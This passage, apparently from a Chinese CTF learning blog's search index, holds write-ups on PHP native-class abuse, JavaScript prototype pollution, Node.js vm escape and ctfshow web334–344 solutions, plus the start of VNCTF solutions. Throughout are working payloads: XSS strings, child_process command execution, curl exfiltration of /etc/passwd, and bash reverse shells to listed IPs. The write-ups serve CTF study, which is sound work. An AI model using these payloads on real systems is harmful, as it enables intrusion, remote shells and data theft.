19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 12: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 13: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 14: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 15: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 16: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 17: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 18: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 19: 241267801518963217329803327254141129383508497053892152707957403620167975, 20: 240324048977128823416619126180138745528644638124733113619292984561, 21: 1501209023627137765492979001172871435243212151481455508796928, 22: 11731219952144596819377276074864534430521345582519171825, 23: 11050144307727113700681557772687121323224647867153, 24: 10722465754210488857842384539746544074196670, 25: 67952303343509961405922862120527631953, 26: 424678007756192434300006917804988, 27: 449366186013055209469307061, 28: 2694478038943586736328, 29: 24316418691677517, 30: 137492755075, 31: 133317, 32: 1&#125; 然后再用(L[i]-R[i+1])//L[i+1]求出flag[i]**3 + flower的值 FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125; 由于1的ascii的三次方和2的ascii码之间的差值也要比最大的flower大，所以我们就可以遍历一下 得到flag值 FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125; flag &#x3D; &#39;&#39; for i in range(32): #FLAG[i] &#x3D; (L[i]-R[i+1])&#x2F;&#x2F;L[i+1] for j in range(48,123): if j**3 &lt;&#x3D; FLAG[i] and (j+1)**3 &gt; FLAG[i]: flag +&#x3D; chr(j) else: continue print(&#39;flag&#x3D;&#39;+flag[::-1]) &#x2F;&#x2F;3e807b66ef26d38e671ddcbb9c108250","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"从一道ctf题看php原生类","slug":"从一道ctf题看php原生类","date":"2022-02-25T13:06:44.000Z","updated":"2023-05-26T12:02:49.011Z","comments":true,"path":"2022/02/25/从一道ctf题看php原生类/","link":"","permalink":"https://ethe448.github.io/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/","excerpt":"","text":"这是ctfshow的一道比赛题 先来看看源码 &lt;?php error_reporting(0); if(isset($_GET[&#39;source&#39;]))&#123; highlight_file(__FILE__); echo &quot;\\$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;&quot;; die(); &#125; if(isset($_POST[&#39;a&#39;]) &amp;&amp; isset($_POST[&#39;b&#39;]) &amp;&amp; isset($_POST[&#39;c&#39;]))&#123; $c &#x3D; $_POST[&#39;c&#39;]; $count[++$c] &#x3D; 1; if($count[] &#x3D; 1) &#123; $count[++$c] &#x3D; 1; print_r($count); die(); &#125;else&#123; $a &#x3D; $_POST[&#39;a&#39;]; $b &#x3D; $_POST[&#39;b&#39;]; echo new $a($b); &#125; &#125; ?&gt; $flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;; 绕过第二个if判断是利用了数组溢出的原理 然后进入else语句 一般看到echo new $a($b)这种形式，就需要考虑利用php的原生类来遍历目录以及读取文件 报错类Error在PHP7版本中，因为Error中带有__toString方法，该方法会将传入给__toString的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。 a&#x3D;Error&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806 Exception与Error类似，Exception同样有__toString方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。 a&#x3D;Exception&amp;b&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&amp;c&#x3D;9223372036854775806 遍历目录类DirectoryIteratorDirectoryIterator类的__construct方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项 返回了一个点，这个点代表这当前目录 如果要匹配其他文件，要利用glob协议 glob协议支持通配符，所以对于不知道文件名的文件可以利用通配符进行匹配 FilesystemIterator与DirectoryIterator类似，但实际使用时发现有些不同 GlobIterator无需加glob协议，因为这是自带的 读取文件类SplFileObject SplFileObject类为文件提供了一个面向对象接口 也就是说我们可以利用这个来读取文件，例如 a&#x3D;SplFileObject&amp;b&#x3D;flag.php 但是由于这个类返回的是迭代器，所以不能完整的读出文件，所以就要利用php://filter来将文件内容以全部输出 回到这道题我们可以利用 FilesystemIterator、DirectoryIterator或GlobIterator找到flag所在的目录，再用SplFileObject读出文件内容 但是这道题中flag文件并不叫flag.php而是flag.md5(???).php，所以我们要用通配符找到真正的flag文件， 在通配符中，？代表一个字符，但是必须存在，而*表示存在任意个字符，但是也包括零个，所以因为迭代器的性质，只加*就只能匹配到flag.php 但是如果我们用FilesystemIterator，我们可以直接加路径看到这个flag文件，不太理解为什么 接下来就是用SplFileObject读出来就然后base64解个码就行 反射类获取注释看见这个想起了去年国赛我唯一出了的一道题 &lt;?php highlight_file(__file__); class User &#123; private static $c &#x3D; 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; &#x2F;** * flag *&#x2F; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125; &#125; $rc&#x3D;$_GET[&quot;rc&quot;]; $rb&#x3D;$_GET[&quot;rb&quot;]; $ra&#x3D;$_GET[&quot;ra&quot;]; $rd&#x3D;$_GET[&quot;rd&quot;]; $method&#x3D; new $rc($ra, $rb); var_dump($method-&gt;$rd()); flag在注释里但并不会被显示出来，但是我们可以利用通过反射 ReflectionMethod 类来获取类方法的相关信息 ?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;e&amp;rd&#x3D;getDocComment 直接查看类可以用ReflectionClass 反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system(&#39;cmd&#39;))来执行命令 ReflectionFunction这玩意能执行命令 demo &lt;?php $function &#x3D; new ReflectionFunction(&#39;system&#39;); echo $function-&gt;invoke(&quot;whoami&quot;); ?&gt; &lt;?php $function &#x3D; new ReflectionFunction(&#39;call_user_func&#39;); echo $function-&gt;invokeArgs(array(&#39;s&#39;.&#39;y&#39;.&#39;s&#39;.&#39;tem&#39;,&#39;whoami&#39;)); &#x2F;&#x2F;array(%27s%27.%27y%27.%27s%27.%27tem%27,%27cat%20&#x2F;f%27.%27lag%27) ?&gt;","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"js漏洞","slug":"js漏洞","date":"2022-02-21T07:09:54.000Z","updated":"2022-09-26T07:36:01.597Z","comments":true,"path":"2022/02/21/js漏洞/","link":"","permalink":"https://ethe448.github.io/2022/02/21/js%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"原型链污染深入了解JavaScript在JavaScript中，一切皆对象 当我们创建一个js对象如 var a &#x3D; &#123;&#125;; 它会拥有一些自带的属性，如 JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义： 这里test()函数的内容其实就是test类的构造函数 而constructor这个属性就是用于查看对象的构造函数 接下来我们要知道prototype和**__proto__**又是什么 从类的角度讲，prototype是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有__proto__出现，且一个对象的proto属性，指向这个对象所在的类的prototype属性。 这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。 对于a而言有个__proto__属性指向window.Object.prototype 这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.__proro__ 上面去找 toString。 所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString 对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show() 总结一下 prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法 一个对象的__proto__属性，指向这个对象所在的类的prototype属性 类在运行程序运行时是可以修改的 JavaScript的原型与原型链这种继承机制使得JavaScript中有原型和原型链的存在 原型 ①所有引用类型都有一个__proto__(隐式原型)属性，属性值是一个普通的对象②所有函数都有一个prototype(原型)属性，属性值是一个普通的对象③所有引用类型的__proto__属性指向它构造函数的prototype 原型链 当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。 举例： 若有代码 function Parent(month)&#123; this.month &#x3D; month; &#125; var child &#x3D; new Parent(&#39;Ann&#39;); console.log(child.month); &#x2F;&#x2F; Ann console.log(child.father); &#x2F;&#x2F; undefined 则在child中查找某个属性时会 什么是原型链污染Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。 所以我们可以通过修改Object.prototype来实现对变量的修改 可以看到我们将a._proto_.bar 设置为2 新定义的变量也有了bar属性，且为2 那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。 原型链污染的利用当存在控制数组（对象）的“键名”的操作时，我们就可以设置__proto__的值，从而实现原型链污染 最显然的情况obj[a][b] &#x3D; value obj[a][b][c] &#x3D; value 如果控制了a,b,c及value就可以进行原型链污染的攻击, 可以控制a=__proto__,,我们就可以给object对象的原型设置一个b属性, 值为value. 这样所有继承object对象原型的实例对象会在本身不拥有b属性的情况下, 都会拥有b属性, 且值为value. 利用特殊的api 对象merge 对象clone（其实内核就是将待操作的对象merge到一个空对象中） 例如 function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] &#x3D; source[key] &#125; &#125; &#125; 这时如果key是__proto__不就可以直接修改其原型了吗 但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;）中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。 只有经过JSON.parse解析,才能让__proto__代表了一个key 成功污染 参考文章： 深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com) 【原型和原型链】什么是原型和原型链_沉迷学习 日渐消瘦-CSDN博客_原型链 原型链污染漏洞(一)_lonmar的博客-CSDN博客 从杭电hgame-week4学原型链污染 - 简书 (jianshu.com) 三张图搞懂JavaScript的原型对象与原型链 - 水乙 - 博客园 (cnblogs.com) JavaScript Prototype污染攻击（CTF 例题分析）_a3320315的博客-CSDN博客 node.js 沙盒逃逸背景在nodejs当中了，eval始终存在着一定的问题，能够出乎意料的执行系统命令。 对于存在利用可能性的eval函数，可以使用chile_process.exec来间接调用&#x2F;bash.sh。 它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。 like： 读取文件： require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);; 反弹shell： q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;); 即bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1 类eval函数： setInteval(some_function, 2000) setTimeout(some_function, 2000); 相当于匿名函数，即php当中create_function。 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。 在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用 vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。 也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息 这看起来是十分安全的方式 但在官网中有这样一段话vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。 也就是说，vm模块同样有被逃逸的风险 VM逃逸const vm &#x3D; require(&quot;vm&quot;); const ctx &#x3D; &#123;&#125;; vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx); console.log(&quot;Never gets executed.&quot;); 这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出 创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function 函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。 上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。 所以我们能够用process变量来做更多的东西 或者这样 参考文章 ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客 node.js 沙盒逃逸分析 - JavaShuo 你终于回来了(。・∀・)ノ (cnblogs.com) Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com) CTFSHOW nodejs部分web334 用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行 web335js的命令执行 可以使用chile_process.exec来间接调用/bash.sh。它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。 exec因为返回值的问题没法利用 所以这里可以用execSync eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;) eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;) 或者spawnSync eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString() eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString() 还可以用global.process.mainModule.constructor._load替代require eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;) web336过滤了exec 但是可以用spawnSync 还可以利用fs模块文件操作 eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;); eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;); web337数组绕过，但是不同于php的数组绕过 var express &#x3D; require(&#39;express&#39;); var router &#x3D; express.Router(); var crypto &#x3D; require(&#39;crypto&#39;); function md5(s) &#123; return crypto.createHash(&#39;md5&#39;) .update(s) .digest(&#39;hex&#39;); &#125; &#x2F;* GET home page. *&#x2F; router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123; res.type(&#39;html&#39;); var flag&#x3D;&#39;xxxxxxx&#39;; var a &#x3D; req.query.a; var b &#x3D; req.query.b; if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;); &#125; &#125;); module.exports &#x3D; router; 传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同 js有个很奇怪的特性 不能直接比较两个数组 而且拼接字符串时也有个特性 也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag 而如果我们传入的是非数字索引，那么他就会变成js中的对象 对象的拼接又有这种特性 所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag web338common.js里有copy函数 猜测是原型链污染 看login.js 让secert的ctfshow属性等于36dboy {&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}} 抓包之后改一下 web339非预期解：利用ejs模板rce漏洞 羽师傅的payload： &#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\\&quot;&#39;);var _llama2&quot;&#125;&#125; 反弹之前可以先关一下服务器的防火墙systemctl stop firewalld 几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn) CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客 预期解： 登录部分 同样的copy函数 这里要求ctfshow=flag的内容，可我们并不知道flag 我们再看看api.js Function里的query变量没有被引用 如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作 但是这个是变量不是变量的属性，也能污染吗 答案是可以的 因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在 所以我们可以构造payload &#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125; 在login页面post一下进行污染 然后访问一下api页面触发query web340登录部分 copy函数： 这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象 所以我们的payload为 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; 同样传入之后访问一下api页面就行 web341没有了api.js 所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125; web342-web343同样是模板引擎的rce，不过不是之前的ejs，而是jade 再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com) 几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn) ejs原型污染rce分析 - 先知社区 (aliyun.com) 用一个payload都能打 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; web344代码： router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123; res.type(&#39;html&#39;); var flag &#x3D; &#39;flag_here&#39;; if(req.url.match(&#x2F;8c|2c|\\,&#x2F;ig))&#123; res.end(&#39;where is flag :)&#39;); &#125; var query &#x3D; JSON.parse(req.query.query); if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123; res.end(flag); &#125;else&#123; res.end(&#39;where is flag. :)&#39;); &#125; &#125;); 如果没有过滤，那么我们直接传入 ?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125; 就行，但是题目把逗号和他的url编码过滤了 这时就要尝试用&amp;绕过 nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析 所以最终payload为 ?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; 把c也编码的原因是防止和双引号的url编码构成%22c 1 const crypto &#x3D; require(&#39;crypto&#39;); const express &#x3D; require(&#39;express&#39;); const session &#x3D; require(&quot;express-session&quot;); const app &#x3D; express(); const jwt &#x3D; require(&quot;jsonwebtoken&quot;); const fs &#x3D; require(&quot;fs&quot;) const bodyParser &#x3D; require(&#39;body-parser&#39;) session_secret &#x3D; Math.random().toString(36).substr(2); const cookieParser &#x3D; require(&#39;cookie-parser&#39;); const &#123;json&#125; &#x3D; require(&quot;express&quot;); app.use(cookieParser(session_secret)); app.use(bodyParser.json()) app.use(session(&#123; secret: session_secret, resave: true, saveUninitialized: true &#125;)) const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;); app.post(&#39;&#x2F;register&#39;, function (req, res) &#123; const username &#x3D; req.body.name; if ( username &#x3D;&#x3D; &#39;admin&#39;)&#123; res.send(&quot;admin not allowed&quot;); return &#125; const token &#x3D; jwt.sign(&#123;username&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;); res.send(&#123;token: token&#125;); &#125;); app.post(&#39;&#x2F;login&#39;, function (req, res) &#123; const token &#x3D; req.body.auth try &#123; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;,function (_,user)&#123; console.log(user) req.session.user &#x3D; &#123;&quot;username&quot;:user.username&#125; &#125;); &#125;catch (e) &#123; res.send(&quot;login error&quot;) return &#125; res.send(req.session.user.username + &quot; login successfully&quot;) &#125;); app.post(&#39;&#x2F;readfile&#39;, function (req, res) &#123; if (req.session.user.username !&#x3D;&#x3D; &quot;admin&quot;)&#123; res.send(&quot;only admin can get flag&quot;) return &#125; if (typeof req.body[&quot;secret&quot;] !&#x3D;&#x3D; &quot;number&quot;)&#123; &#x2F;&#x2F;仅允许16进字符串 let regex_pattern &#x3D; &#x2F;^[a-fA-F\\d.]+$&#x2F; if (!regex_pattern.test(req.body[&quot;secret&quot;]))&#123; res.send(&quot;only valid string under 16 radix allowed&quot;) return &#125; &#125; if (req.body.file &amp;&amp; parseInt(req.body[&quot;secret&quot;],16) &#x3D;&#x3D;&#x3D; 158 &amp;&amp; parseFloat(req.body[&quot;secret&quot;]) &lt; 9)&#123; let file_param &#x3D; JSON.stringify(req.body.file) if (file_param.includes(&quot;flag&quot;) || file_param.includes(&quot;fd&quot;)) &#123; res.send(&quot;flag not allowed&quot;) return &#125;else &#123; res.setHeader(&quot;Content-Type&quot;, &quot;text&#x2F;html&quot;); res.send(fs.readFileSync(req.body.file || &quot;app.js&quot;).toString()) return &#125; &#125; res.send(&quot;try to read &#x2F;flag&quot;) &#125;); app.get(&#39;&#x2F;&#39;, function (req, res) &#123; res.send(&#39;see &#96;&#x2F;src&#96;&#39;); &#125;); app.get(&#39;&#x2F;src&#39;, function (req, res) &#123; var data &#x3D; fs.readFileSync(&#39;app.js&#39;); res.send(data.toString()); &#125;); app.listen(3000, function () &#123; console.log(&#39;start listening on port 3000&#39;); &#125;); 1","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"VNCTF复现","slug":"VNCTF复现","date":"2022-02-13T14:34:31.000Z","updated":"2022-04-25T12:57:21.306Z","comments":true,"path":"2022/02/13/VNCTF复现/","link":"","permalink":"https://ethe448.github.io/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"webGameV4.0纯签到题 源码里找flag base64解码 gocalc0非预期解： &#123;&#123;.&#125;&#125; 查源码 flag在/flag路径，尝试去访问 然后提示flag在session中 对session进行base64解码(第二次解码如果全放进去解不出内容，要一点一点试) 预期解： 拿到源码之后根据源码写个exp package main import ( _ &quot;embed&quot; &quot;fmt&quot; &quot;os&quot; &quot;reflect&quot; &quot;strings&quot; &quot;text&#x2F;template&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot; &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot; &quot;github.com&#x2F;maja42&#x2F;goval&quot; ) &#x2F;&#x2F;go:embed template&#x2F;index.html var tpl string &#x2F;&#x2F;go:embed main.go var source string type Eval struct &#123; E string &#96;json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;&#96; &#125; func (e Eval) Result() (string, error) &#123; eval :&#x3D; goval.NewEvaluator() result, err :&#x3D; eval.Evaluate(e.E, nil, nil) if err !&#x3D; nil &#123; return &quot;&quot;, err &#125; t :&#x3D; reflect.ValueOf(result).Type().Kind() if t &#x3D;&#x3D; reflect.Int &#123; return fmt.Sprintf(&quot;%d&quot;, result.(int)), nil &#125; else if t &#x3D;&#x3D; reflect.String &#123; return result.(string), nil &#125; else &#123; return &quot;&quot;, fmt.Errorf(&quot;not valid type&quot;) &#125; &#125; func (e Eval) String() string &#123; res, err :&#x3D; e.Result() if err !&#x3D; nil &#123; fmt.Println(err) res &#x3D; &quot;invalid&quot; &#125; return fmt.Sprintf(&quot;%s &#x3D; %s&quot;, e.E, res) &#125; func render(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) var his string if session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123; his &#x3D; &quot;&quot; &#125; else &#123; his &#x3D; session.Get(&quot;history&quot;).(string) &#125; fmt.Println(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his)) t, err :&#x3D; template.New(&quot;index&quot;).Parse(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his)) if err !&#x3D; nil &#123; fmt.Println(err) c.String(500, &quot;internal error&quot;) return &#125; if err :&#x3D; t.Execute(c.Writer, map[string]string&#123; &quot;s0uR3e&quot;: source, &#125;); err !&#x3D; nil &#123; fmt.Println(err) &#125; &#125; func main() &#123; port :&#x3D; os.Getenv(&quot;PORT&quot;) if port &#x3D;&#x3D; &quot;&quot; &#123; port &#x3D; &quot;8080&quot; &#125; r :&#x3D; gin.Default() store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;)) r.Use(sessions.Sessions(&quot;session&quot;, store)) r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123; render(c) &#125;) r.GET(&quot;&#x2F;flag&quot;, func(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) session.Set(&quot;FLAG&quot;, os.Getenv(&quot;FLAG&quot;)) session.Save() c.String(200, &quot;flag is in your session&quot;) &#125;) r.POST(&quot;&#x2F;&quot;, func(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) var his string if session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123; his &#x3D; &quot;&quot; &#125; else &#123; his &#x3D; session.Get(&quot;history&quot;).(string) &#125; eval :&#x3D; Eval&#123;&#125; if err :&#x3D; c.ShouldBind(&amp;eval); err &#x3D;&#x3D; nil &#123; his &#x3D; his + eval.String() + &quot;&lt;br&#x2F;&gt;&quot; &#125; session.Set(&quot;history&quot;, his) session.Save() render(c) &#125;) r.Run(fmt.Sprintf(&quot;:%s&quot;, port)) &#125; exp： package main import ( _ &quot;embed&quot; &quot;fmt&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot; &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot; &quot;os&quot; ) func main() &#123; port :&#x3D; os.Getenv(&quot;PORT&quot;) if port &#x3D;&#x3D; &quot;&quot; &#123; port &#x3D; &quot;8080&quot; &#125; r :&#x3D; gin.Default() store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;)) r.Use(sessions.Sessions(&quot;session&quot;, store)) r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) println(session.Get(&quot;FLAG&quot;).(string)) &#125;) r.Run(fmt.Sprintf(&quot;:%s&quot;, port)) &#125; 这部分等学了go之后再看看，先放着 newcalc0考点：原型污染通过 console.table 